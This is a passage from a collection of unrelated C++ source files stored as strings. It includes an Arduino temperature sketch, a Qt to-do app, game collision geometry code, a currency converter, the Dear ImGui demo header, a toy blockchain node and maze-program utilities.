::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// C++ code\n// Code Created by Shrut Chokshi \n\n\n\n#include <Wire.h>\n#include \"rgb_lcd.h\"\n#include <math.h>\n\nconst int buttonPin = 2;     // the number of the pushbutton pin\n\n\n// variables will change:\nint buttonState = 0;         // variable for reading the pushbutton status\n\nrgb_lcd lcd;\n\nconst int colorR = 255;\nconst int colorG = 0;\nconst int colorB = 0;\n\nint counter = 0; \n\nconst int B = 4275;               // B value of the thermistor\nconst int R0 = 100000;            // R0 = 100k\nconst int pinTempSensor = A0;     // Grove - Temperature Sensor connect to A0\nconst int buzzer = A1; \n\n// #if defined(ARDUINO_ARCH_AVR)\n// #define debug  Serial\n// #elif defined(ARDUINO_ARCH_SAMD) ||  defined(ARDUINO_ARCH_SAM)\n// #define debug  SerialUSB\n// #else\n// #define debug  Serial\n// #endif\n\nvoid setup()\n{\n //pinMode(2,INPUT);  \n   pinMode(13,OUTPUT);\n   pinMode(6, OUTPUT);\n\n\n  Serial.begin(9600);\n   //Serial.print(\"running\");\n\n  pinMode(11, OUTPUT);\n  pinMode(10, OUTPUT);\n  pinMode(9, OUTPUT);\n\n  digitalWrite(9, LOW);\n\n\n  // set up the LCD's number of columns and rows:\n    lcd.begin(16, 2);\n    \n    lcd.setRGB(colorR, colorG, colorB);\n    \n    // Print a message to the LCD.\n\n    delay(1000);\n\n    pinMode(buttonPin, INPUT);\n}\n\nvoid loop(){\n\n\t//digitalWrite(13, HIGH);\n\n  //analogWrite(11, 255);\n  //analogWrite(10, 255);\n  //analogWrite(9, 255);\n\n  int a = analogRead(pinTempSensor);\n\n    float R = 1023.0/a-1.0;\n    R = R0*R;\n\n    float temperature = 1.0/(log(R/R0)/B+1/298.15)-273.15; // convert to temperature via datasheet\n\n    Serial.print(\"temperature = \");\n    Serial.println(temperature);\n\n    //lcd.print(\"hi!\");\n    delay(100);\n\n      if (temperature > 10)\n      {\n      digitalWrite(13, HIGH);\n\n      //analogWrite(11, 0);\n      analogWrite(10, 0);\n      //analogWrite(9, 0);\n\n      if (counter < 3)\n      {\n        digitalWrite(6, HIGH);\n        delay(600);\n        digitalWrite(6, LOW);\n        delay(600);\n        counter++;\n      }\n\n      }\n    \t\n      if (temperature <= 10)\n      {\n      //analogWrite(11, 255);\n      analogWrite(10, 255);\n      //analogWrite(9, 255);\n\n      digitalWrite(13, LOW);\n      counter = 0;\n\n      }\n     \n     // set the cursor to column 0, line 1\n    // (note: line 1 is the second row, since counting begins with 0):\n    lcd.setCursor(0, 1);\n    // print the number of seconds since reset:\n    lcd.print(millis()/1000);\n\n    buttonState = digitalRead(buttonPin);\n\n    // check if the pushbutton is pressed.\n    // if it is, the buttonState is HIGH:\n    if (buttonState == HIGH) {\n\n      digitalWrite(9, HIGH);\n\n    }\n\n    else {\n\n      digitalWrite(9, LOW);\n    }\n\n   // int sensorState = digitalRead(A2);\n    //Serial.println(sensorState);\n    delay(100);\n    \n\n    delay(100);\n}\n\n   \n\n  //digitalWrite(13, HIGH); //Turn the LED on\n  //delay(1000); //wait one second\n  //digitalWrite(13, LOW);\n  //delay(1000);\n",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QDir>\n#include <QFile>\n#include <QTextStream>\n#include <QMessageBox>\n#include <QFont>\n\nconst QString TASKS_DIRECTORY = \"./tasks/\";\nconst QString TASKS_EXTENSION = \"*.tasks\";\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent), ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    setWindowTitle(\"TODO LISTS\");\n\n    listFilesWithExtension();\n    ui->listWidget->setSelectionMode(QAbstractItemView::SingleSelection);\n\n    connect(ui->openButton, &QPushButton::clicked, this, &MainWindow::loadTasks);\n    connect(ui->saveButton, &QPushButton::clicked, this, &MainWindow::saveList);\n    connect(ui->pushButton, &QPushButton::clicked, this, &MainWindow::addNewTask);\n    connect(ui->listWidget, &QListWidget::itemClicked, this, &MainWindow::toggleTask);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::listFilesWithExtension()\n{\n    QDir dir(TASKS_DIRECTORY);\n\n    if (!dir.exists()) {\n        qDebug() << \"Folder nie istnieje!\";\n        return;\n    }\n\n    QStringList filters { TASKS_EXTENSION };\n    QStringList fileNames = dir.entryList(filters, QDir::Files);\n    QStringList existingItems;\n\n    for (int i = 0; i < ui->comboBox->count(); ++i) {\n        existingItems << ui->comboBox->itemText(i);\n    }\n\n    for (const QString &file : fileNames) {\n        if (!existingItems.contains(file)) {\n            ui->comboBox->addItem(file);\n        }\n    }\n}\n\nvoid MainWindow::toggleTask(QListWidgetItem* item)\n{\n    QFont font = item->font();\n    font.setStrikeOut(!font.strikeOut());\n    item->setFont(font);\n}\n\nvoid MainWindow::addNewTask()\n{\n    const QString taskText = ui->lineEdit->text();\n    if (taskText.isEmpty()) {\n        return;\n    }\n\n    ui->listWidget->addItem(taskText);\n}\n\nvoid MainWindow::saveList()\n{\n    const QString fileName = ui->saveLineEdit->text();\n    if (fileName.isEmpty()) {\n        QMessageBox::warning(nullptr, \"B\u0142\u0105d\", \"Nale\u017cy poda\u0107 nazw\u0119 pliku!\");\n        return;\n    }\n\n    QFile file(TASKS_DIRECTORY + fileName + \".tasks\");\n    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {\n        QMessageBox::warning(nullptr, \"B\u0142\u0105d\", \"Nie uda\u0142o si\u0119 otworzy\u0107 pliku!\");\n        return;\n    }\n\n    QTextStream out(&file);\n    for (int i = 0; i < ui->listWidget->count(); ++i) {\n        QListWidgetItem* item = ui->listWidget->item(i);\n        const QString taskText = item->text();\n        const bool isStrikeOut = item->font().strikeOut();\n        out << taskText << \",\" << (isStrikeOut ? \"1\" : \"0\") << \"\\n\";\n    }\n\n    file.close();\n    listFilesWithExtension();\n    QMessageBox::information(nullptr, \"Sukces\", \"Zadania zosta\u0142y zapisane do pliku!\");\n}\n\nvoid MainWindow::loadTasks()\n{\n    ui->listWidget->clear();\n\n    const QString filePath = TASKS_DIRECTORY + ui->comboBox->currentText();\n    QFile file(filePath);\n\n    if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        QMessageBox::warning(nullptr, \"B\u0142\u0105d\", \"Nie uda\u0142o si\u0119 otworzy\u0107 pliku!\");\n        return;\n    }\n\n    QTextStream in(&file);\n    while (!in.atEnd()) {\n        const QString line = in.readLine();\n        const QStringList parts = line.split(\",\");\n\n        if (parts.size() == 2) {\n            const QString taskText = parts[0];\n            const bool isStrikeOut = (parts[1] == \"1\");\n\n            QListWidgetItem* newItem = new QListWidgetItem(taskText);\n            QFont font = newItem->font();\n            font.setStrikeOut(isStrikeOut);\n            newItem->setFont(font);\n\n            ui->listWidget->addItem(newItem);\n        }\n    }\n\n    file.close();\n}\n",
    "#include \"cm_terrain.hpp\"\n#include \"cm_typedefs.hpp\"\n\n#include \"cg/cg_local.hpp\"\n#include \"cg/cg_offsets.hpp\"\n#include <unordered_map>\n#include <ranges>\n#include <com/com_vector.hpp>\n#include <iostream>\n\n#define MASK_PLAYERSOLID 0x02810011\n\nbool CM_AabbTreeHasCollision(const CollisionAabbTree* tree)\n{\n\tconst dmaterial_t* materialInfo = &cm->materials[tree->materialIndex];\n\treturn (materialInfo->contentFlags & MASK_PLAYERSOLID) != 0;\n}\n\nstd::unordered_map<CollisionPartition*, CollisionPartition*> discovered_partitions;\n\n\nbool CM_DiscoverTerrain([[maybe_unused]]const std::unordered_set<std::string>& filters)\n{\n\n\ttry {\n\t\tdiscovered_partitions.clear();\n\t\tfor (const auto i : std::views::iota(0u, cm->numLeafs)) {\n\n\t\t\tauto terrain = CM_LeafToGeometry(&cm->leafs[i], filters);\n\n\t\t\tif (terrain)\n\t\t\t\tCClipMap::Insert(terrain);\n\t\t}\n\t\treturn true;\n\t}\n\tcatch (...) {\n\t\treturn false;\n\t}\n}\n\nvoid CM_AdvanceAabbTree(const CollisionAabbTree* aabbTree, cm_terrain* terrain, const std::unordered_set<std::string>& filters, const float* color)\n{\n\tif (aabbTree->childCount) {\n\t\tauto child = &cm->aabbTrees[aabbTree->u.firstChildIndex];\n\t\tfor ([[maybe_unused]]const auto i : std::views::iota(0u, aabbTree->childCount)) {\n\t\t\tCM_AdvanceAabbTree(child, terrain, filters, color);\n\t\t\t++child;\n\t\t}\n\t\treturn;\n\t}\n\n\tconst auto mat = cm->materials[aabbTree->materialIndex].material;\n\tif (CM_IsMatchingFilter(filters, mat) == false) {\n\t\treturn;\n\t}\n\n\tterrain->material = mat;\n\tterrain->color[0] = color[0];\n\tterrain->color[1] = color[1];\n\tterrain->color[2] = color[2];\n\tterrain->color[3] = color[3];\n\n\tCollisionAabbTreeIndex fChild = aabbTree->u;\n\tCollisionPartition* partition = &cm->partitions[fChild.partitionIndex];\n\n\tif (discovered_partitions.find(partition) != discovered_partitions.end())\n\t\treturn;\n\n\tdiscovered_partitions[partition] = partition;\n\n\tauto firstTri = partition->firstTri;\n\tif (firstTri < firstTri + partition->triCount)\n\t{\n\n\t\tauto triIndice = 3 * firstTri;\n\n\t\tdo {\n\t\t\tcm_triangle tri;\n\t\t\ttri.has_collision = CM_AabbTreeHasCollision(aabbTree);\n\t\t\ttri.a = cm->verts[cm->triIndices[triIndice]];\n\t\t\ttri.b = cm->verts[cm->triIndices[triIndice + 1]];\n\t\t\ttri.c = cm->verts[cm->triIndices[triIndice + 2]];\n\n\t\t\tPlaneFromPointsASM(tri.plane, tri.a, tri.b, tri.c);\n\n\t\t\ttri.color[0] = color[0];\n\t\t\ttri.color[1] = color[1];\n\t\t\ttri.color[2] = color[2];\n\t\t\ttri.color[3] = 0.3f;\n\n\t\t\tterrain->tris.emplace_back(tri);\n\n\t\t\t++firstTri;\n\t\t\ttriIndice += 3;\n\n\t\t} while (firstTri < partition->firstTri + partition->triCount);\n\n\t}\n}\n\nstd::unique_ptr<cm_geometry> CM_LeafToGeometry(const cLeaf_t* leaf, const std::unordered_set<std::string>& filters)\n{\n\tif (!leaf || !leaf->collAabbCount)\n\t\treturn 0;\n\n\tstd::int32_t aabbIdx = 0;\n\tcm_terrain terrain;\n\n\tterrain.leaf = leaf;\n\n\tdo {\n\t\tconst CollisionAabbTree* aabb = &cm->aabbTrees[aabbIdx + leaf->firstCollAabbIndex];\n\t\tCM_AdvanceAabbTree(aabb, &terrain, filters, vec4_t{ 0,0.1f,1.f, 0.8f });\n\t\t++aabbIdx;\n\t} while (aabbIdx < leaf->collAabbCount);\n\n\n\treturn std::make_unique<cm_terrain>(terrain);\n}\n\nbool CM_TriangleInView(const cm_triangle* tris, struct cplane_s* frustumPlanes, int numPlanes)\n{\n\tif (numPlanes <= 0)\n\t\treturn 1;\n\tcplane_s* plane = frustumPlanes;\n\tint idx = 0;\n\twhile ((BoxOnPlaneSide(tris->get_mins(), tris->get_maxs(), plane) & 1) != 0) {\n\t\t++plane;\n\t\t++idx;\n\n\t\tif (idx >= numPlanes)\n\t\t\treturn 1;\n\t}\n\n\treturn 0;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\n// p.s. Print prime numbers from given vector of integers\n\n// method 1: (Using simple function to check and print)\n/* bool isPrime(int x) {\n    for (int i = 2; i < x; i++)\n        if (x % i == 0)\n            return false;\n    return true;\n}\nvoid printPrime(int n) {\n    if (isPrime(n))\n        cout << n << \" \";\n}\n\nint main() {\n    vector<int> vec = {3, 9, 7, 64, 81, 52, 29, 8};\n    for_each(vec.begin(), vec.end(), printPrime);\n\n    return 0;\n} */\n\n// method 2: (Using functor/operator overloading to check and print)\n/* class Prime {\npublic:\n    bool isPrime(int x) {\n        for (int i = 2; i < x; i++)\n            if (x % i == 0)\n                return false;\n        return true;\n    }\n\n    void operator ()(int n) {\n        if (isPrime(n))\n            cout << n << \" \";\n    }\n\n};\n\nint main() {\n    vector<int> vec = {3, 9, 7, 64, 81, 52, 29, 8};\n    for_each(vec.begin(), vec.end(), Prime());\n\n    return 0;\n} */\n\n// method 3: Using simple, easy, without jhanjhat, lambda function:\nint main() {\n    vector<int> vec = {3, 9, 7, 64, 81, 52, 29, 8};\n    for_each(vec.begin(), vec.end(), [](int x) {\n        int i;\n        for (i = 2; i < x; i++) {\n            if (x % i == 0)\n                break;\n        }\n        if (i == x)\n            cout << x << \" \";\n    });\n\n    return 0;\n}",
    "//#ifndef TESTMAP_H\n//#define TESTMAP_H\n//\n//#include \"Map.h\"\n//#include <iostream>\n//\n///**\n// * @file   TestMap.h\n// * @author Emirhan Kalkan\n// * @date   December, 2024\n// * @brief  Header file for the TestMap class, which contains methods to test the Map class.\n// *\n// * This file contains the definition of the TestMap class, including methods for running tests\n// * on the Map class, covering various functionalities like constructors, methods, and grid resizing.\n// */\n//class TestMap {\n//public:\n//    /**\n//     * @brief Runs all the tests for the Map class.\n//     *\n//     * This method runs a series of tests to ensure that the Map class is functioning as expected.\n//     */\n//    void runAllTests();\n//\n//private:\n//    /**\n//     * @brief Tests the constructor of the Map class.\n//     */\n//    void testConstructor();\n//\n//    /**\n//     * @brief Tests the clearMap method of the Map class.\n//     */\n//    void testClearMap();\n//\n//    /**\n//     * @brief Tests the insertPoint method of the Map class.\n//     */\n//    void testInsertPoint();\n//\n//    /**\n//     * @brief Tests the getGrid and setGrid methods of the Map class.\n//     */\n//    void testGetAndSetGrid();\n//\n//    /**\n//     * @brief Tests the addGridSize method of the Map class to resize the grid.\n//     */\n//    void testResizeGrid();\n//\n//    /**\n//     * @brief Tests the showMap method of the Map class.\n//     */\n//    void testShowMap();\n//};\n//\n//#endif // TESTMAP_H\n//\n",
    "#include <iostream>\n#include <array>\n#include <random>\n#include <cmath>\n#include <chrono> // For timing\n#include \"ffcm2_h2.h\" // Change file name to desired header file\n\nusing Scalar = float;\n\n// Function to scale the elements of the input array randomly\nvoid scale_input(std::array<Scalar, 12>& input) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_real_distribution<Scalar> dist(0.5, 1.5); // Random scaling factor between 0.5 and 1.5\n\n    for (auto& element : input) {\n        element *= dist(gen);\n    }\n}\n\nvoid print_state(std::array<Scalar, 11>& output, Scalar time)\n{\n    std::cout << time;\n\n    for (const auto& val : output)\n    {\n        std::cout <<\",\"<< val;\n    }\n\n    std::cout << std::endl;\n}\n\nvoid append_state(std::array<Scalar, 12>& input, std::array<Scalar, 11>& output)\n{\n    for (int i = 0; i < 11; i++) { input[i] = output[i];}\n}\n\n\nstd::array<Scalar, 11> predict_combustion(const std::array<Scalar, 12>& input) {\n    std::array<Scalar, 12> input_real;\n    for (int i = 0; i < 12; i++) {\n        if (i >= 2 && i < 11) {\n            input_real[i] = (pow(input[i], 0.1) - 1) / 0.1; // Boxcox lambda = 0.1\n        } else {\n            input_real[i] = input[i];\n        }\n    }\n\n    auto model_output = ffcm2_h2<Scalar>(input_real); // Change input to desired features\n\n    std::array<Scalar, 11> output_real;\n    for (int i = 0; i < 11; i++) {\n        output_real[i] = model_output[i] + input_real[i]; // NN outputs change of state properties, transferred to real values\n    }\n\n    std::array<Scalar, 11> output;\n    for (int i = 0; i < 11; i++) {\n        if (i >= 2 && i < 11) {\n            output[i] = pow(output_real[i] * 0.1 + 1, 10.0); // Inverse Boxcox transformation\n        } else {\n            output[i] = output_real[i];\n        }\n    }\n\n    return output;\n}\n\nint main() {\n    std::array<Scalar, 12> input = { \n        1800.0, // Temperature, K \n        5.0, // Pressure, atm \n        0.0, // Mass fraction of 9 species, starts, H \n        0.11190674, // H2 \n        0.0, \n        0.88809326, // O2 \n        0.0, \n        0.0, \n        0.0, \n        0.0, \n        0.0, // Mass fraction, ends, O3 \n        -9.0 // log10(time step, s) \n    }; // State properties at current time\n\n    auto start_time = std::chrono::high_resolution_clock::now();\n\n    for(int i=0; i<1000; i++)\n    {\n        auto output = predict_combustion(input);\n        print_state(output, pow(10.0, input[11]) * (Scalar(i)+1.0));\n        append_state(input, output);\n    }\n\n    auto end_time = std::chrono::high_resolution_clock::now();\n\n    // Calculate the elapsed time in milliseconds\n    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time).count();\n\n    // Report the elapsed time\n    //std::cout << \"Execution Time: \" << elapsed_time << \" ms\" << std::endl;\n\n\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <map>\n#include <string>\n#include \"../include/curl/curl.h\"\n#include \"../include/nlohmann/json.hpp\"\n\nusing json = nlohmann::json;\nusing namespace std;\n\nsize_t WriteCallback(void *contents, size_t size, size_t nmemb, std::string *output)\n{\n    size_t total_size = size * nmemb;\n    output->append(static_cast<char *>(contents), total_size);\n    return total_size;\n}\n\nint main()\n{\n    CURL *curl = curl_easy_init();\n\n    if (curl)\n    {\n        string fromCurrency, toCurrency;\n        double amount;\n\n        cout << \"=== Currency Converter ===\" << endl;\n\n        cout << \"Enter source currency (e.g., usd): \";\n        cin >> fromCurrency;\n\n        cout << \"Enter target currency (e.g., eur): \";\n        cin >> toCurrency;\n\n        cout << \"Enter amount: \";\n        cin >> amount;\n\n       \n        const std::string url = \"https://cdn.jsdelivr.net/npm/@fawazahmed0/currency-api@latest/v1/currencies/\" + fromCurrency + \".json\";\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n\n        std::string response;\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);\n\n        CURLcode res = curl_easy_perform(curl);\n\n        if (res == CURLE_OK)\n        {\n            try\n            {\n                // Parse the JSON response\n                auto jsonData = json::parse(response);\n\n                // Check if target currency exists in the JSON\n                if (jsonData[fromCurrency].contains(toCurrency))\n                {\n                    double exchangeRate = jsonData[fromCurrency][toCurrency];\n                    double convertedAmount = amount * exchangeRate;\n\n                    cout << \"Exchange Rate (\" << fromCurrency << \" to \" << toCurrency << \"): \" << exchangeRate << endl;\n                    cout << \"Converted Amount: \" << convertedAmount << \" \" << toCurrency << endl;\n                }\n                else\n                {\n                    cerr << \"Error: Target currency not found in the response!\" << endl;\n                }\n            }\n            catch (const json::exception &e)\n            {\n                cerr << \"Error parsing JSON: \" << e.what() << endl;\n            }\n        }\n        else\n        {\n            // If request failed, print error\n            cerr << \"cURL error: \" << curl_easy_strerror(res) << endl;\n        }\n\n        // Cleanup CURL object\n        curl_easy_cleanup(curl);\n    }\n    else\n    {\n        cerr << \"Error initializing CURL\" << endl;\n    }\n\n    return 0;\n}\n",
    "// dear imgui, v1.83\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowMisc()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Font Viewer / ShowFontAtlas()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n// System includ",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <chrono>\n#include <functional>\n#include <thread>\n#include <boost/asio.hpp>\n#include <openssl/sha.h>\n#include <iomanip>\n#include <memory>\n\nusing boost::asio::ip::tcp;\n\nstd::string sha256(const std::string &data)\n{\n    unsigned char hash[SHA256_DIGEST_LENGTH];\n    SHA256((unsigned char *)data.c_str(), data.size(), hash);\n\n    std::stringstream ss;\n    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i)\n        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];\n    return ss.str();\n}\n\nstruct Block\n{\n    int index;\n    std::string timestamp;\n    std::string data;\n    std::string prev_hash;\n    std::string hash;\n\n    Block(int idx, const std::string &d, const std::string &prev)\n        : index(idx), data(d), prev_hash(prev)\n    {\n        timestamp = std::to_string(std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()));\n        hash = calculate_hash();\n    }\n\n    std::string calculate_hash() const\n    {\n        std::stringstream ss;\n        ss << index << timestamp << data << prev_hash;\n        return sha256(ss.str());\n    }\n};\n\nclass Blockchain\n{\npublic:\n    Blockchain()\n    {\n        chain.emplace_back(create_genesis_block());\n    }\n\n    Block create_genesis_block()\n    {\n        return Block(0, \"Genesis Block\", \"0\");\n    }\n\n    void add_block(const std::string &data)\n    {\n        const Block &prev_block = chain.back();\n        chain.emplace_back(Block(chain.size(), data, prev_block.hash));\n    }\n\n    const std::vector<Block> &get_chain() const\n    {\n        return chain;\n    }\n\nprivate:\n    std::vector<Block> chain;\n};\n\nclass Node\n{\npublic:\n    Node(boost::asio::io_context &io_context, int port)\n        : acceptor_(io_context, tcp::endpoint(tcp::v4(), port))\n    {\n        start_accept();\n    }\n\n    void connect_to_peer(const std::string &host, int port)\n    {\n        auto socket = std::make_shared<tcp::socket>(acceptor_.get_executor());\n\n        boost::system::error_code ec;\n        socket->connect(tcp::endpoint(boost::asio::ip::address::from_string(host, ec), port), ec);\n        if (!ec)\n        {\n            peers_.push_back(socket);\n            std::cout << \"Connected to peer at \" << host << \":\" << port << std::endl;\n        }\n        else\n        {\n            std::cerr << \"Failed to connect to peer: \" << ec.message() << std::endl;\n        }\n    }\n\n    void broadcast(const std::string &message)\n    {\n        for (const auto &peer : peers_)\n        {\n            boost::asio::async_write(\n                *peer,\n                boost::asio::buffer(message + \"\\n\"),\n                [peer](const boost::system::error_code &error, std::size_t /*bytes_transferred*/)\n                {\n                    if (error)\n                    {\n                        std::cerr << \"Failed to send message to a peer: \" << error.message() << std::endl;\n                    }\n                });\n        }\n    }\n\nprivate:\n    void start_accept()\n    {\n        auto new_socket = std::make_shared<tcp::socket>(acceptor_.get_executor());\n\n        acceptor_.async_accept(*new_socket, [this, new_socket](const boost::system::error_code &error)\n                               {\n        if (!error) {\n            peers_.push_back(new_socket);\n            std::cout << \"New peer connected!\" << std::endl;\n        } else {\n            std::cerr << \"Error accepting connection: \" << error.message() << std::endl;\n        }\n        start_accept(); });\n    }\n\n    tcp::acceptor acceptor_;\n    std::vector<std::shared_ptr<tcp::socket>> peers_;\n};\n\nint main(int argc, char *argv[])\n{\n    if (argc < 3)\n    {\n        std::cerr << \"Usage: ./blockchain_node <port> <peer_host> <peer_port>\" << std::endl;\n        return 1;\n    }\n\n    int port = std::stoi(argv[1]);\n    std::string peer_host = argv[2];\n    int peer_port = std::stoi(argv[3]);\n\n    boost::asio::io_context context;\n\n    Blockchain blockchain;\n    Node node(context, port);\n\n    std::thread([&context]()\n                { context.run(); })\n        .detach();\n\n    if (!peer_host.empty())\n    {\n        node.connect_to_peer(peer_host, peer_port);\n    }\n\n    std::string command;\n    while (true)\n    {\n        std::cout << \"(add <data> / print / exit): \";\n        std::getline(std::cin, command);\n\n        if (command == \"exit\")\n            break;\n        else if (command.find(\"add \") == 0)\n        {\n            std::string data = command.substr(4);\n            blockchain.add_block(data);\n            node.broadcast(\"New block added: \" + data);\n        }\n        else if (command == \"print\")\n        {\n            for (const auto &block : blockchain.get_chain())\n            {\n                std::cout << \"Block \" << block.index << \": \" << block.data << \" (\" << block.hash << \")\" << std::endl;\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "/*\n** Daedalus (Version 3.3) File: util.cpp\n** By Walter D. Pullen, Astara@msn.com, http://www.astrolog.org/labyrnth.htm\n**\n** IMPORTANT NOTICE: Daedalus and all Maze generation and general\n** graphics routines used in this program are Copyright (C) 1998-2018 by\n** Walter D. Pullen. Permission is granted to freely use, modify, and\n** distribute these routines provided these credits and notices remain\n** unmodified with any altered or distributed versions of the program.\n** The user does have all rights to Mazes and other graphic output\n** they make in Daedalus, like a novel created in a word processor.\n**\n** More formally: This program is free software; you can redistribute it\n** and/or modify it under the terms of the GNU General Public License as\n** published by the Free Software Foundation; either version 2 of the\n** License, or (at your option) any later version. This program is\n** distributed in the hope that it will be useful and inspiring, but\n** WITHOUT ANY WARRANTY; without even the implied warranty of\n** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n** General Public License for more details, a copy of which is in the\n** LICENSE.HTM included with Daedalus, and at http://www.gnu.org\n**\n** This file contains generic utilities. Nothing here is related to graphics\n** or any other part of Daedalus.\n**\n** Created: 6/4/1993.\n** Last code change: 11/29/2018.\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <memory.h>\n#include <math.h>\n#include \"util.h\"\n\n\nUS us = {fTrue, 0L, 0L, 0L};\n\n\n/*\n******************************************************************************\n** General Routines\n******************************************************************************\n*/\n\n// Global new and delete operator implementations.\n\nvoid *operator new(size_t cb)\n{\n  void *pv;\n\n  pv = PAllocate((long)cb);\n  return pv;\n}\n\nvoid operator delete(void *pv)\n{\n  DeallocateP(pv); \n}\n\n#ifndef PC\nvoid *operator new(size_t cb, void *pv)\n{\n  return pv;\n}\n\nvoid operator delete(void *pv, void *pv2)\n{\n}\n#endif\n\n\n// Change the size of a memory allocation, containing a list of cElem items of\n// cbElem size, to a list of cElemNew items of cbElem size.\n\nvoid *ReallocateArray(void *rgElem, int cElem, int cbElem, int cElemNew)\n{\n  void *rgElemNew;\n\n  rgElemNew = PAllocate(cElemNew * cbElem);\n  if (rgElemNew == NULL)\n    return NULL;\n  ClearPb(rgElemNew, cElemNew * cbElem);\n  if (rgElem != NULL)\n    CopyPb(rgElem, rgElemNew, cElem * cbElem);\n  return rgElemNew;\n}\n\n\n// Display a string with an integer parameter embedded in it.\n\nint PrintSzNCore(CONST char *sz, int n, int nPriority)\n{\n  char szT[cchSzDef];\n\n  sprintf(S(szT), sz, n);\n  return PrintSzCore(szT, nPriority);\n}\n\n\n// Display a string with two integer parameters embedded in it.\n\nint PrintSzNNCore(CONST char *sz, int n1, int n2, int nPriority)\n{\n  char szT[cchSzDef];\n\n  sprintf(S(szT), sz, n1, n2);\n  return PrintSzCore(szT, nPriority);\n}\n\n\n// Display a string with a long integer parameter embedded in it.\n\nint PrintSzLCore(CONST char *sz, long l, int nPriority)\n{\n  char szT[cchSzDef];\n\n  sprintf(S(szT), sz, l);\n  return PrintSzCore(szT, nPriority);\n}\n\n\n// Return whether n is in the range 